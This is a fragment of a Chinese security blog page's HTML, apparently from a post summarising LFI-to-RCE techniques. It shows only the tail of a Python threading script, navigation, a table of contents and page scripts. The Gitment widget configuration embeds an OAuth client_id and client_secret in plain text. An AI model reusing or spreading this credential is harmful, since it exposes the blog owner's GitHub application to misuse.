class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"\nTelling threads to shutdown..."</span></span><br><span class="line">        e.set()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Shuttin' down..."</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> tp:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#WEB安全" >
+    <span class="tag-code">WEB安全</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2019/05/12/open-basedir%E4%BB%A3%E7%A0%81%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">
+        <span class="nav-arrow">← </span>
+        
+          open_basedir代码绕过总结
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2019/05/21/RCTF-nextphp%E9%A2%98%E8%A7%A3/">
+        
+          RCTF | nextphp题解
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#文件写入"><span class="toc-nav-text">文件写入</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#系统文件"><span class="toc-nav-text">系统文件</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#session-webshell"><span class="toc-nav-text">session webshell</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#CTF"><span class="toc-nav-text">CTF</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#伪协议"><span class="toc-nav-text">伪协议</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#ctf"><span class="toc-nav-text">ctf</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#LFI-php7崩溃"><span class="toc-nav-text">LFI+php7崩溃</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#漏洞测试"><span class="toc-nav-text">漏洞测试</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#phpinfo缓存文件"><span class="toc-nav-text">phpinfo缓存文件</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#python脚本"><span class="toc-nav-text">python脚本</span></a></li></ol></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://zhzhdoai.github.io/2019/05/14/LFItoRCE总结/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+  <script>
+    var gitmentConfig = "osword";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "LFItoRCE总结",
+        owner: "osword",
+        repo: "osword.github.io",
+        oauth: {
+          client_id: "7d7576c71632f14d639a",
+          client_secret: "3d7f7e4c0e9a43a2cc5334d68aee612090df8b70"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a>
+  </p>
+    访问量<span id="busuanzi_value_site_pv"></span>,
+    访客数<span id="busuanzi_value_site_uv"></span>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
